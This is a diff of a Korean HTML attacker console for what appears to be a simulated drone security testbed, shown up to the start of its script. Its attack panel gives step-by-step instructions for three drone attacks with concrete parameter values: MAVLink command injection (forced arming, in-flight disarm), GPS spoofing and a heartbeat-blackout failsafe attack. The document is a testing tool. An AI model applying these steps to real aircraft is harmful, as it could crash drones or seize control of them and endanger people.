@@ -2,254 +2,1267 @@
 <html lang="ko">
 <head>
 <meta charset="UTF-8">
-<title>Attacker — 패킷 스트림</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Attacker Console — UAV Security Testbed</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
 <style>
-* { box-sizing: border-box; margin: 0; padding: 0; }
-body { font-family: 'Courier New', monospace; background: #0a0e14; color: #cdd6f4; height: 100vh; display: flex; flex-direction: column; }
-header {
-  background: #1e2030; padding: 8px 16px; border-bottom: 1px solid #363a4f;
-  display: flex; align-items: center; gap: 12px; flex-wrap: wrap;
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#080c12;--surface:#0f1520;--panel:#131c2a;--border:#1e2d3d;
+  --text:#c5d4e8;--muted:#4a6070;--accent:#3a8fd4;
+  --red:#e05555;--green:#44c87a;--yellow:#e0a840;--purple:#9b72d4;
+  --red-dim:#3a1515;--green-dim:#0d3020;--yellow-dim:#2a2010;
 }
-header h1 { font-size: 14px; color: #ed8796; letter-spacing: 2px; }
-.dot { width: 8px; height: 8px; border-radius: 50%; background: #ed8796; flex-shrink: 0; }
-.dot.on { background: #a6e3a1; }
-#ws-status { font-size: 11px; color: #6e738d; }
-.sep { flex: 1; }
-.ctrl { display: flex; align-items: center; gap: 6px; }
-.ctrl label { font-size: 11px; color: #6e738d; }
-select {
-  background: #181926; color: #cdd6f4; border: 1px solid #363a4f;
-  padding: 4px 8px; font-family: inherit; font-size: 11px; border-radius: 3px;
-}
-button {
-  background: #363a4f; color: #cdd6f4; border: 1px solid #494d64;
-  padding: 4px 10px; font-family: inherit; font-size: 11px; cursor: pointer; border-radius: 3px;
-}
-button:hover { background: #494d64; }
-button.paused { border-color: #eed49f; color: #eed49f; }
-#counter { font-size: 11px; color: #6e738d; min-width: 60px; text-align: right; }
+body{font-family:'Courier New',monospace;background:var(--bg);color:var(--text);
+  height:100vh;display:flex;flex-direction:column;overflow:hidden;font-size:15px}
 
-/* 컬럼 헤더 */
-.col-head {
-  display: flex; gap: 8px; padding: 4px 12px;
-  font-size: 10px; color: #494d64; border-bottom: 1px solid #363a4f;
-  letter-spacing: 0.5px; text-transform: uppercase; flex-shrink: 0;
+/* HEADER */
+#hdr{
+  background:var(--surface);border-bottom:1px solid var(--border);
+  padding:6px 12px;display:flex;align-items:center;gap:10px;flex-shrink:0;
 }
-.col-head .c-ts   { width: 66px; flex-shrink: 0; }
-.col-head .c-dir  { width: 14px; flex-shrink: 0; }
-.col-head .c-did  { width: 76px; flex-shrink: 0; }
-.col-head .c-name { width: 240px; flex-shrink: 0; }
-.col-head .c-hex  { flex: 1; }
+#hdr h1{font-size:19px;color:var(--red);letter-spacing:2px;white-space:nowrap}
+.dot{width:8px;height:8px;border-radius:50%;background:var(--red);flex-shrink:0}
+.dot.on{background:var(--green)}
+#ws-lbl{font-size:15px;color:var(--muted)}
+.sep{flex:1}
+#active-attacks{font-size:15px;color:var(--yellow);display:none}
 
-#stream { flex: 1; overflow-y: auto; }
+/* MAIN GRID */
+#main{flex:1;display:grid;grid-template-columns:1fr 1fr;grid-template-rows:1fr 1fr;
+  gap:3px;padding:3px;overflow:hidden;min-height:0}
 
-.pkt {
-  display: flex; align-items: baseline; gap: 8px;
-  padding: 3px 12px; border-bottom: 1px solid #181926; font-size: 11px; line-height: 1.6;
+.panel{background:var(--panel);border:1px solid var(--border);
+  border-radius:3px;display:flex;flex-direction:column;min-height:0;overflow:hidden}
+.panel-hdr{
+  padding:6px 12px;border-bottom:1px solid var(--border);font-size:16px;
+  color:var(--muted);letter-spacing:1px;text-transform:uppercase;
+  display:flex;align-items:center;gap:8px;flex-shrink:0;
 }
-.pkt:hover { background: #1e2030; }
-.c-ts   { color: #6e738d; flex-shrink: 0; width: 66px; }
-.c-dir  { font-weight: bold; flex-shrink: 0; width: 14px; }
-.pkt.down .c-dir { color: #a6e3a1; }
-.pkt.up   .c-dir { color: #f5a97f; }
-.c-did  { color: #8aadf4; flex-shrink: 0; width: 76px; }
-.c-name { color: #c6a0f6; flex-shrink: 0; width: 240px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
-.c-name .kr { color: #c6a0f6; }
-.c-name .en { color: #6e738d; font-size: 10px; }
-.c-hex  { color: #cdd6f4; opacity: 0.6; word-break: break-all; flex: 1; }
-.c-fields { color: #a6da95; font-size: 10px; opacity: 0.85; flex-shrink: 0; max-width: 380px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+.panel-hdr span{flex:1}
+
+/* MAP */
+#map-wrap{flex:1;position:relative}
+#map{width:100%;height:100%}
+
+/* PACKET STREAM */
+.col-head{
+  display:flex;gap:6px;padding:4px 10px;font-size:15px;color:var(--muted);
+  border-bottom:1px solid var(--border);flex-shrink:0;
+  letter-spacing:0.5px;text-transform:uppercase;
+}
+.col-head .c-ts{width:80px;flex-shrink:0}
+.col-head .c-dir{width:18px;flex-shrink:0}
+.col-head .c-did{width:90px;flex-shrink:0}
+.col-head .c-name{width:230px;flex-shrink:0}
+.col-head .c-hex{flex:1}
+
+.pkt{display:flex;gap:6px;padding:4px 10px;border-bottom:1px solid #0a0f18;font-size:15px;line-height:1.6}
+.pkt:hover{background:#0f1925}
+.pkt.attack-pkt{background:var(--red-dim);border-left:2px solid var(--red)}
+.c-ts{color:var(--muted);width:80px;flex-shrink:0}
+.c-dir{font-weight:bold;width:18px;flex-shrink:0}
+.pkt.down .c-dir{color:var(--green)}
+.pkt.up   .c-dir{color:#e09040}
+.pkt.atk  .c-dir{color:var(--red)}
+.c-did{color:var(--accent);width:90px;flex-shrink:0}
+.c-name{color:#9b72d4;width:230px;flex-shrink:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.c-name .kr{color:#9b72d4}.c-name .en{color:var(--muted);font-size:15px}
+.c-hex{color:var(--text);opacity:.6;word-break:break-all;flex:1}
+.c-fields{color:var(--green);font-size:15px;opacity:.85;flex-shrink:0;max-width:340px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+
+/* ATTACK PANEL */
+.atk-tabs{display:flex;gap:2px;padding:5px 8px;border-bottom:1px solid var(--border);flex-shrink:0}
+.atk-tab{
+  padding:4px 12px;border:1px solid var(--border);border-radius:2px;
+  cursor:pointer;font-size:15px;color:var(--muted);background:var(--surface);
+  transition:all .15s;
+}
+.atk-tab:hover{color:var(--text);border-color:var(--accent)}
+.atk-tab.active{color:var(--text);border-color:var(--accent);background:#0d1e30}
+.atk-tab.running{border-color:var(--yellow);color:var(--yellow);animation:pulse 1.2s infinite}
+.atk-tab.success{border-color:var(--green);color:var(--green)}
+.atk-tab.fail{border-color:var(--red);color:var(--red)}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
+
+.atk-body{flex:1;overflow-y:auto;padding:10px;min-height:0}
+.atk-section{display:none}
+.atk-section.active{display:block}
+
+.atk-desc{
+  font-size:15px;color:var(--muted);line-height:1.7;
+  border-left:2px solid var(--accent);padding:7px 10px;
+  margin-bottom:10px;background:#0a1520;border-radius:0 2px 2px 0;
+}
+.form-row{display:flex;align-items:center;gap:8px;margin-bottom:7px}
+.form-row label{font-size:15px;color:var(--muted);width:110px;flex-shrink:0}
+.form-row select,.form-row input[type="number"],.form-row input[type="text"]{
+  flex:1;background:var(--surface);color:var(--text);border:1px solid var(--border);
+  padding:4px 7px;font-family:inherit;font-size:15px;border-radius:2px;
+}
+.form-row input[type="checkbox"]{flex:none}
+.form-row select:focus,.form-row input:focus{outline:none;border-color:var(--accent)}
+
+.btn-row{display:flex;gap:8px;margin-top:10px}
+.btn{
+  padding:6px 16px;border:1px solid;border-radius:2px;cursor:pointer;
+  font-family:inherit;font-size:15px;letter-spacing:1px;transition:all .15s;
+}
+.btn-launch{border-color:var(--red);color:var(--red);background:var(--red-dim)}
+.btn-launch:hover:not(:disabled){background:#5a1010}
+.btn-launch:disabled{opacity:.4;cursor:not-allowed}
+.btn-stop{border-color:var(--muted);color:var(--muted);background:transparent}
+.btn-stop:hover:not(:disabled){border-color:var(--yellow);color:var(--yellow)}
+.btn-stop:disabled{opacity:.4;cursor:not-allowed}
+
+.atk-log-box{
+  margin-top:10px;font-size:15px;color:var(--muted);
+  border:1px solid var(--border);border-radius:2px;padding:6px 8px;
+  max-height:100px;overflow-y:auto;background:var(--surface);
+  font-family:'Courier New',monospace;
+}
+.log-start{color:var(--accent)}.log-progress{color:var(--muted)}
+.log-success{color:var(--green)}.log-fail{color:var(--red)}.log-stop{color:var(--yellow)}
+
+/* EVIDENCE PANEL */
+#ev-tabs{display:flex;gap:2px;padding:5px 8px;border-bottom:1px solid var(--border);flex-shrink:0}
+.ev-tab{
+  padding:4px 12px;border:1px solid var(--border);border-radius:2px;
+  cursor:pointer;font-size:15px;color:var(--muted);background:var(--surface);
+}
+.ev-tab:hover{color:var(--text)}
+.ev-tab.active{color:var(--text);border-color:var(--accent);background:#0d1e30}
+.ev-body{flex:1;overflow-y:auto;padding:10px;min-height:0;display:flex;flex-direction:column;gap:8px}
+.ev-section{display:none;flex-direction:column;gap:8px}
+.ev-section.active{display:flex}
+
+.ev-title{font-size:15px;color:var(--muted);letter-spacing:1px;text-transform:uppercase;margin-bottom:4px}
+.ev-grid{display:grid;grid-template-columns:1fr 1fr;gap:6px}
+.ev-card{
+  background:var(--surface);border:1px solid var(--border);
+  border-radius:3px;padding:9px;
+}
+.ev-card.before{border-left:2px solid var(--accent)}
+.ev-card.after-ok{border-left:2px solid var(--green)}
+.ev-card.after-fail{border-left:2px solid var(--red)}
+.ev-card-label{font-size:15px;color:var(--muted);margin-bottom:5px;letter-spacing:1px}
+.ev-field{font-size:15px;margin-bottom:3px}
+.ev-field .fk{color:var(--muted)}
+.ev-field .fv{color:var(--text)}
+.ev-field .fv.changed{color:var(--green);font-weight:bold}
+.ev-field .fv.bad{color:var(--red);font-weight:bold}
+.ev-verdict{
+  text-align:center;padding:10px;border-radius:3px;font-size:15px;letter-spacing:1px;
+}
+.ev-verdict.success{background:var(--green-dim);color:var(--green);border:1px solid var(--green)}
+.ev-verdict.fail{background:var(--red-dim);color:var(--red);border:1px solid var(--red)}
+.ev-verdict.pending{background:var(--yellow-dim);color:var(--yellow);border:1px solid var(--yellow)}
+.ev-metric .val{color:var(--text);font-size:20px;display:block;margin-bottom:2px}
+
+/* Code block */
+.code-block{
+  background:#080c12;border:1px solid var(--border);border-radius:3px;
+  padding:10px;font-size:15px;line-height:1.7;overflow-x:auto;flex:1;
+  white-space:pre;color:#a8c0d0;
+}
+.code-block .kw{color:#6ba3d6}
+.code-block .fn{color:#c792ea}
+.code-block .cm{color:#4a6070;font-style:italic}
+.code-block .st{color:#7ec88a}
+.code-block .nu{color:#e0a840}
+
+/* Flow canvas */
+#flow-canvas{width:100%;flex:1;min-height:0;display:block;background:#080c12}
+
+/* Stream controls */
+.stream-ctrl{display:flex;gap:6px;padding:5px 8px;border-bottom:1px solid var(--border);flex-shrink:0;flex-wrap:wrap;align-items:center}
+.stream-ctrl select{
+  background:var(--surface);color:var(--text);border:1px solid var(--border);
+  padding:3px 5px;font-family:inherit;font-size:15px;border-radius:2px;
+}
+.stream-ctrl button{
+  background:var(--surface);color:var(--muted);border:1px solid var(--border);
+  padding:3px 10px;font-family:inherit;font-size:15px;border-radius:2px;cursor:pointer;
+}
+.stream-ctrl button:hover{color:var(--text)}
+#btn-atk-filter{
+  border-color:var(--red);color:var(--red);background:transparent;
+  font-weight:bold;letter-spacing:0.5px;transition:all .15s;
+}
+#btn-atk-filter.active{background:var(--red-dim)}
+#btn-atk-filter:hover{background:var(--red-dim)}
+#pkt-count{font-size:15px;color:var(--muted);margin-left:auto;align-self:center}
+
+/* Attack info box */
+.atk-info{
+  background:#0a1520;border:1px solid var(--border);border-radius:3px;
+  margin-bottom:10px;overflow:hidden;
+}
+.atk-info-hdr{
+  display:flex;align-items:center;gap:8px;
+  padding:6px 10px;border-bottom:1px solid var(--border);
+  background:#0d1b2a;
+}
+.atk-badge{
+  font-size:15px;font-weight:bold;letter-spacing:1.5px;
+  padding:2px 7px;border-radius:2px;flex-shrink:0;
+}
+.atk-badge.red   {background:var(--red-dim);color:var(--red);border:1px solid var(--red)}
+.atk-badge.yellow{background:var(--yellow-dim);color:var(--yellow);border:1px solid var(--yellow)}
+.atk-badge.purple{background:#1e1035;color:#b08ae0;border:1px solid #7a54c0}
+.atk-info-title{font-size:15px;color:var(--text);font-weight:bold}
+.atk-info-body{padding:8px 10px;display:flex;flex-direction:column;gap:6px}
+.atk-summary{font-size:15px;color:var(--muted);line-height:1.6}
+.atk-steps{display:flex;flex-direction:column;gap:3px}
+.atk-step{display:flex;align-items:flex-start;gap:7px;font-size:15px;color:var(--muted);line-height:1.5}
+.step-num{
+  min-width:20px;height:20px;border-radius:50%;
+  background:var(--border);color:var(--text);
+  display:flex;align-items:center;justify-content:center;
+  font-size:15px;font-weight:bold;flex-shrink:0;margin-top:1px;
+}
+.atk-step b{color:var(--text)}
+.atk-criterion{
+  font-size:15px;padding:5px 8px;border-radius:2px;
+  border-left:2px solid var(--green);background:var(--green-dim);
+  color:var(--green);line-height:1.5;
+}
+.atk-warn{
+  font-size:15px;padding:5px 8px;border-radius:2px;
+  border-left:2px solid var(--yellow);background:var(--yellow-dim);
+  color:var(--yellow);line-height:1.5;
+}
+
+::-webkit-scrollbar{width:4px;height:4px}
+::-webkit-scrollbar-track{background:var(--surface)}
+::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px}
 </style>
 </head>
 <body>
-<header>
-  <h1>ATTACKER / 패킷 스트림</h1>
-  <span class="dot" id="dot"></span>
-  <span id="ws-status">연결 중...</span>
-  <div class="sep"></div>
-  <div class="ctrl">
-    <label>드론</label>
-    <select id="f-drone">
-      <option value="">ALL</option>
-    </select>
-  </div>
-  <div class="ctrl">
-    <label>타입</label>
-    <select id="f-type">
-      <option value="">전체</option>
-      <option value="HEARTBEAT">상태신호 (HEARTBEAT)</option>
-      <option value="GLOBAL_POSITION_INT">GPS위치 (GLOBAL_POSITION_INT)</option>
-      <option value="VFR_HUD">비행계기 (VFR_HUD)</option>
-      <option value="SYS_STATUS">기체상태 (SYS_STATUS)</option>
-      <option value="COMMAND_LONG">명령전송 (COMMAND_LONG)</option>
-      <option value="COMMAND_ACK">명령응답 (COMMAND_ACK)</option>
-    </select>
-  </div>
-  <button id="btn-pause">일시정지</button>
-  <button id="btn-clear">초기화</button>
-  <span id="counter">0 pkts</span>
-</header>
-<div class="col-head">
-  <span class="c-ts">시각</span>
-  <span class="c-dir">방향</span>
-  <span class="c-did">드론</span>
-  <span class="c-name">메시지 유형</span>
-  <span class="c-hex">HEX / 파싱값</span>
-</div>
-<div id="stream"></div>
-<script>
-const stream   = document.getElementById('stream');
-const dot      = document.getElementById('dot');
-const wsEl     = document.getElementById('ws-status');
-const fDrone   = document.getElementById('f-drone');
-const fType    = document.getElementById('f-type');
-const btnPause = document.getElementById('btn-pause');
-const btnClear = document.getElementById('btn-clear');
-const counter  = document.getElementById('counter');
 
-const MSG_KR = {
-  HEARTBEAT:                  '상태신호',
-  SYS_STATUS:                 '기체상태',
-  SYSTEM_TIME:                '시스템시간',
-  PING:                       '핑',
-  GPS_RAW_INT:                'GPS원시',
-  GPS_STATUS:                 'GPS상태',
-  RAW_IMU:                    'IMU원시',
-  SCALED_PRESSURE:            '기압계',
-  ATTITUDE:                   '기체자세',
-  ATTITUDE_QUATERNION:        '자세쿼터니언',
-  LOCAL_POSITION_NED:         '로컬위치',
-  GLOBAL_POSITION_INT:        'GPS위치',
-  RC_CHANNELS:                'RC채널',
-  RC_CHANNELS_RAW:            'RC채널원시',
-  SERVO_OUTPUT_RAW:           '서보출력',
-  MISSION_CURRENT:            '현재미션',
-  NAV_CONTROLLER_OUTPUT:      '항법출력',
-  VFR_HUD:                    '비행계기',
-  COMMAND_LONG:               '명령전송',
-  COMMAND_ACK:                '명령응답',
-  POSITION_TARGET_GLOBAL_INT: '목표위치',
-  BATTERY_STATUS:             '배터리상태',
-  AUTOPILOT_VERSION:          '자동항법버전',
-  LANDING_TARGET:             '착륙목표',
-  POWER_STATUS:               '전원상태',
-  MEMINFO:                    '메모리',
-  SCALED_IMU2:                'IMU2',
-  SCALED_IMU3:                'IMU3',
-  SCALED_PRESSURE2:           '기압계2',
-  SCALED_PRESSURE3:           '기압계3',
-  AHRS:                       '자세기준계',
-  AHRS2:                      '자세기준계2',
-  AHRS3:                      '자세기준계3',
-  SIMSTATE:                   '시뮬상태',
-  TERRAIN_REPORT:             '지형보고',
-  WIND:                       '풍속',
-  VIBRATION:                  '진동',
-  EKF_STATUS_REPORT:          '위치추정',
-  ESC_TELEMETRY_1_TO_4:       'ESC텔레메트리1-4',
-  ESC_TELEMETRY_5_TO_8:       'ESC텔레메트리5-8',
+<!-- HEADER -->
+<div id="hdr">
+  <h1>ATTACKER CONSOLE</h1>
+  <div class="dot" id="dot"></div>
+  <span id="ws-lbl">연결 중...</span>
+  <div class="sep"></div>
+  <span id="active-attacks">⚡ 공격 실행 중...</span>
+</div>
+
+<!-- MAIN GRID -->
+<div id="main">
+
+  <!-- TOP-LEFT: TACTICAL MAP -->
+  <div class="panel">
+    <div class="panel-hdr">
+      <span>TACTICAL MAP</span>
+      <span id="map-status" style="color:var(--muted);font-size:9px">서울 37.566N 126.978E</span>
+    </div>
+    <div id="map-wrap"><div id="map"></div></div>
+  </div>
+
+  <!-- TOP-RIGHT: PACKET STREAM -->
+  <div class="panel" style="display:flex;flex-direction:column">
+    <div class="panel-hdr"><span>PACKET STREAM (Wireshark)</span></div>
+    <div class="stream-ctrl">
+      <select id="f-drone"><option value="">ALL DRONES</option></select>
+      <select id="f-type">
+        <option value="">전체 메시지</option>
+        <option value="HEARTBEAT">HEARTBEAT</option>
+        <option value="GLOBAL_POSITION_INT">GPS위치</option>
+        <option value="VFR_HUD">비행계기</option>
+        <option value="COMMAND_LONG">명령전송</option>
+        <option value="COMMAND_ACK">명령응답</option>
+        <option value="EKF_STATUS_REPORT">EKF상태</option>
+      </select>
+      <select id="f-dir">
+        <option value="">방향전체</option>
+        <option value="down">↓ Down (드론→서버)</option>
+        <option value="up">↑ Up (GCS→드론)</option>
+      </select>
+      <button id="btn-atk-filter">⚡ 공격 패킷만</button>
+      <button id="btn-pause">일시정지</button>
+      <button id="btn-clear">초기화</button>
+      <span id="pkt-count">0 pkts</span>
+    </div>
+    <div class="col-head">
+      <span class="c-ts">시각</span>
+      <span class="c-dir">↕</span>
+      <span class="c-did">드론ID</span>
+      <span class="c-name">메시지명</span>
+      <span class="c-hex">HEX / 파싱값</span>
+    </div>
+    <div id="stream-wrap" style="flex:1;overflow-y:auto">
+      <div id="stream"></div>
+    </div>
+  </div>
+
+  <!-- BOTTOM-LEFT: ATTACK PANEL -->
+  <div class="panel" id="atk-panel" style="display:flex;flex-direction:column">
+    <div class="panel-hdr"><span>ATTACK SCENARIOS</span></div>
+    <div class="atk-tabs">
+      <div class="atk-tab active" data-tab="att01">ATT-01 명령주입</div>
+      <div class="atk-tab" data-tab="att02">ATT-02 GPS스푸핑</div>
+      <div class="atk-tab" data-tab="att03">ATT-03 신호차단</div>
+    </div>
+    <div class="atk-body">
+
+      <!-- ATT-01 -->
+      <div class="atk-section active" id="sec-att01">
+        <div class="atk-info">
+          <div class="atk-info-hdr">
+            <span class="atk-badge red">ATT-01</span>
+            <span class="atk-info-title">MAVLink 명령 주입 (Unauthenticated Command Injection)</span>
+          </div>
+          <div class="atk-info-body">
+            <div class="atk-summary">
+              MAVLink v1/v2는 기본적으로 <b>인증 메커니즘이 없다</b>. FC(Flight Controller)와 같은 네트워크에 있는 누구든 TCP 소켓으로 직접 접속해 명령 패킷을 보낼 수 있다. 실전 전장에서는 재밍·스푸핑으로 C2 링크를 끊은 뒤 자체 송신기로 동일한 공격을 수행한다.
+            </div>
+            <div class="atk-steps">
+              <div class="atk-step"><span class="step-num">1</span><span>공격 포트 <b>:25760</b>으로 TCP 직접 연결 (FastAPI 서버 완전 우회)</span></div>
+              <div class="atk-step"><span class="step-num">2</span><span>HEARTBEAT 수신으로 드론 sysid·armed·mode 선확인</span></div>
+              <div class="atk-step"><span class="step-num">3</span><span><b>COMMAND_LONG</b>(msg_id=76) 바이너리 패킷 전송 — p2=21196으로 pre-arm 안전 체크 강제 우회</span></div>
+              <div class="atk-step"><span class="step-num">4</span><span><b>COMMAND_ACK</b>(msg_id=77) result 값으로 성공 판정</span></div>
+            </div>
+            <div class="atk-criterion">✔ 성공 기준 — COMMAND_ACK result=0 (ACCEPTED) + HEARTBEAT armed 비트 변화 실측</div>
+          </div>
+        </div>
+        <div class="form-row">
+          <label>대상 드론</label>
+          <select id="att01-drone">
+            <option value="drone-01">drone-01 (port 25760)</option>
+            <option value="drone-02">drone-02 (port 25770)</option>
+            <option value="drone-03">drone-03 (port 25780)</option>
+          </select>
+        </div>
+        <div class="form-row">
+          <label>명령</label>
+          <select id="att01-cmd">
+            <option value="ARM">프로펠러 강제 기동 (ARM) — 안전장치 우회</option>
+            <option value="DISARM">비행 중 추락 유도 (DISARM) — 모터 즉시 정지</option>
+            <option value="GUIDED">제어권 탈취 준비 (GUIDED) — 외부 명령 수용</option>
+            <option value="TAKEOFF">이륙 (TAKEOFF)</option>
+            <option value="RTL">기지복귀 (SET_MODE RTL)</option>
+            <option value="SEQUENCE">시퀀스 공격 (GUIDED→ARM→TAKEOFF→GOTO)</option>
+          </select>
+        </div>
+        <div class="form-row">
+          <label>고도 (m)</label>
+          <input type="number" id="att01-alt" value="30" min="5" max="100"/>
+        </div>
+        <div class="btn-row">
+          <button class="btn btn-launch" id="btn-att01-launch">⚡ 공격 실행</button>
+          <button class="btn btn-stop" id="btn-att01-stop" disabled>■ 중단</button>
+        </div>
+        <div id="atk-log-01" class="atk-log-box" style="display:none"></div>
+      </div>
+
+      <!-- ATT-02 -->
+      <div class="atk-section" id="sec-att02">
+        <div class="atk-info">
+          <div class="atk-info-hdr">
+            <span class="atk-badge red">ATT-02</span>
+            <span class="atk-info-title">GNSS 스푸핑 (GPS Position Spoofing via MAVLink)</span>
+          </div>
+          <div class="atk-info-body">
+            <div class="atk-summary">
+              ArduCopter의 <b>GPS_TYPE=14</b> 설정을 이용하면 MAVLink 네트워크를 통해 외부에서 가짜 GPS 데이터를 FC에 직접 주입할 수 있다. EKF(Extended Kalman Filter)가 이 가짜 신호를 수용하면 드론은 실제로 잘못된 위치로 이동한다. 실전에서는 RF 스푸핑 장비로 동일한 효과를 낸다.
+            </div>
+            <div class="atk-steps">
+              <div class="atk-step"><span class="step-num">1</span><span>PARAM_SET으로 <b>GPS_TYPE=14</b> 설정 — 외부 MAVLink GPS 소스 허용</span></div>
+              <div class="atk-step"><span class="step-num">2</span><span>GLOBAL_POSITION_INT로 현재 실제 위치 읽기 (기준점 확보)</span></div>
+              <div class="atk-step"><span class="step-num">3</span><span><b>GPS_INPUT</b>(msg_id=113) 10Hz로 위·경도 오프셋을 단계적으로 증가시키며 주입</span></div>
+              <div class="atk-step"><span class="step-num">4</span><span>EKF가 가짜 위치를 수용 → <b>EKF_STATUS_REPORT flags 0x80</b>(CONST_POS_MODE) 점등</span></div>
+            </div>
+            <div class="atk-criterion">✔ 성공 기준 — 주입 오프셋 누적 &gt;5m + EKF flags 0x80 실측</div>
+            <div class="atk-warn">⚠ 드론이 실제로 이동하므로 SITL 테스트 전용. 실기체 사용 금지</div>
+          </div>
+        </div>
+        <div class="form-row">
+          <label>대상 드론</label>
+          <select id="att02-drone">
+            <option value="drone-01">drone-01</option>
+            <option value="drone-02">drone-02</option>
+            <option value="drone-03">drone-03</option>
+          </select>
+        </div>
+        <div class="form-row">
+          <label>지속시간 (s)</label>
+          <input type="number" id="att02-duration" value="60" min="10" max="300"/>
+        </div>
+        <div class="form-row">
+          <label>스텝 (m/주입)</label>
+          <input type="number" id="att02-step" value="1.0" min="0.1" max="10" step="0.1"/>
+        </div>
+        <div class="form-row">
+          <label>최대오프셋 (m)</label>
+          <input type="number" id="att02-max" value="200" min="10" max="1000"/>
+        </div>
+        <div class="btn-row">
+          <button class="btn btn-launch" id="btn-att02-launch">⚡ 공격 실행</button>
+          <button class="btn btn-stop" id="btn-att02-stop" disabled>■ 중단</button>
+        </div>
+        <div id="atk-log-02" class="atk-log-box" style="display:none"></div>
+      </div>
+
+      <!-- ATT-03 -->
+      <div class="atk-section" id="sec-att03">
+        <div class="atk-info">
+          <div class="atk-info-hdr">
+            <span class="atk-badge yellow">ATT-03</span>
+            <span class="atk-info-title">통신 두절 공격 (GCS Heartbeat Blackout → Failsafe RTL)</span>
+          </div>
+          <div class="atk-info-body">
+            <div class="atk-summary">
+              ArduCopter는 GCS로부터 <b>FS_GCS_TIMEOUT(기본 5초)</b> 동안 HEARTBEAT가 없으면 자동으로 RTL(Return To Launch) Failsafe를 발동한다. 공격자가 GCS로 위장해 HEARTBEAT를 전송한 뒤 갑자기 차단하면 드론은 임무 중 귀환을 강제당한다. 실전에서는 C2 주파수 재밍으로 동일 효과를 낸다.
+            </div>
+            <div class="atk-steps">
+              <div class="atk-step"><span class="step-num">1</span><span>PARAM_SET으로 <b>FS_GCS_ENABLE=1</b> 확인·설정 (RTL Failsafe 활성화)</span></div>
+              <div class="atk-step"><span class="step-num">2</span><span>GCS로 위장해 <b>HEARTBEAT(MAV_TYPE_GCS)</b> 1Hz 전송 → 드론이 GCS 연결 인식 (워밍업)</span></div>
+              <div class="atk-step"><span class="step-num">3</span><span>★ HEARTBEAT 전송 즉시 중단 (재밍 시뮬레이션)</span></div>
+              <div class="atk-step"><span class="step-num">4</span><span>타이머 경과 후 HEARTBEAT <b>custom_mode 4(GUIDED) → 6(RTL)</b> 전환 감지</span></div>
+            </div>
+            <div class="atk-criterion">✔ 성공 기준 — HEARTBEAT custom_mode=6(RTL) 전환 + 차단 후 경과 시간 실측</div>
+            <div class="atk-warn">⚠ Armed+비행 중일 때만 Failsafe 발동. Disarmed 상태에선 STATUSTEXT 경고만 출력</div>
+          </div>
+        </div>
+        <div class="form-row">
+          <label>대상 드론</label>
+          <select id="att03-drone">
+            <option value="drone-01">drone-01</option>
+            <option value="drone-02">drone-02</option>
+            <option value="drone-03">drone-03</option>
+          </select>
+        </div>
+        <div class="form-row">
+          <label>워밍업 (s)</label>
+          <input type="number" id="att03-warmup" value="10" min="5" max="60"/>
+        </div>
+        <div class="form-row">
+          <label>감시시간 (s)</label>
+          <input type="number" id="att03-watch" value="30" min="10" max="120"/>
+        </div>
+        <div class="form-row">
+          <label>재주입</label>
+          <input type="checkbox" id="att03-reattack"/>
+          <span style="font-size:15px;color:var(--muted);margin-left:4px">RTL 후 GUIDED+GOTO 주입</span>
+        </div>
+        <div class="btn-row">
+          <button class="btn btn-launch" id="btn-att03-launch">⚡ 공격 실행</button>
+          <button class="btn btn-stop" id="btn-att03-stop" disabled>■ 중단</button>
+        </div>
+        <div id="atk-log-03" class="atk-log-box" style="display:none"></div>
+      </div>
+
+    </div><!-- atk-body -->
+  </div>
+
+  <!-- BOTTOM-RIGHT: EVIDENCE PANEL -->
+  <div class="panel" style="display:flex;flex-direction:column">
+    <div class="panel-hdr"><span>EVIDENCE &amp; ANALYSIS</span></div>
+    <div id="ev-tabs">
+      <div class="ev-tab active" data-etab="evidence">증거</div>
+      <div class="ev-tab" data-etab="code">코드</div>
+      <div class="ev-tab" data-etab="flow">패킷 흐름</div>
+    </div>
+    <div class="ev-body">
+
+      <!-- EVIDENCE TAB -->
+      <div class="ev-section active" id="etab-evidence">
+        <div id="ev-verdict" class="ev-verdict pending">공격을 실행하면 증거가 여기 표시됩니다</div>
+        <div id="ev-before-after" class="ev-grid" style="display:none"></div>
+        <div id="ev-metrics" class="ev-grid" style="display:none"></div>
+      </div>
+
+      <!-- CODE TAB -->
+      <div class="ev-section" id="etab-code" style="flex:1">
+        <div class="ev-title" id="code-title">ATT-01 — MAVLink 명령 주입</div>
+        <pre class="code-block" id="code-view" style="flex:1;overflow-y:auto"></pre>
+      </div>
+
+      <!-- FLOW TAB -->
+      <div class="ev-section" id="etab-flow" style="flex:1">
+        <div class="ev-title">패킷 흐름 시각화</div>
+        <canvas id="flow-canvas"></canvas>
+      </div>
+
+    </div>
+  </div>
+
+</div><!-- main -->
+
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script>
+// ── STATE ──────────────────────────────────────────────────────────────────
+const S = {
+  drones: {},
+  attacks: {},
+  activeAtk: 'att01',
+  evidenceTab: 'evidence',
+  pktCount: 0,
+  paused: false,
+  atkFilter: false,
+  flowPackets: [],
 };
 
+// 공격 관련 패킷 타입 — 명령/응답/상태전환 (HEARTBEAT 포함: blackout 모드 전환 감지)
+const ATK_MSG_TYPES = new Set(['COMMAND_LONG','COMMAND_ACK','SET_MODE','HEARTBEAT']);
 
-const MAX = 200;
-let paused = false;
-let total  = 0;
-let ws, retry;
+const MSG_KR = {
+  HEARTBEAT:'상태신호', SYS_STATUS:'기체상태', GPS_RAW_INT:'GPS원시',
+  RAW_IMU:'IMU원시', ATTITUDE:'기체자세', LOCAL_POSITION_NED:'로컬위치',
+  GLOBAL_POSITION_INT:'GPS위치', VFR_HUD:'비행계기', COMMAND_LONG:'명령전송',
+  COMMAND_ACK:'명령응답', EKF_STATUS_REPORT:'위치추정', BATTERY_STATUS:'배터리',
+};
 
-btnPause.addEventListener('click', () => {
-  paused = !paused;
-  btnPause.classList.toggle('paused', paused);
-  btnPause.textContent = paused ? '▶ 재개' : '일시정지';
-});
+// ── MAP ────────────────────────────────────────────────────────────────────
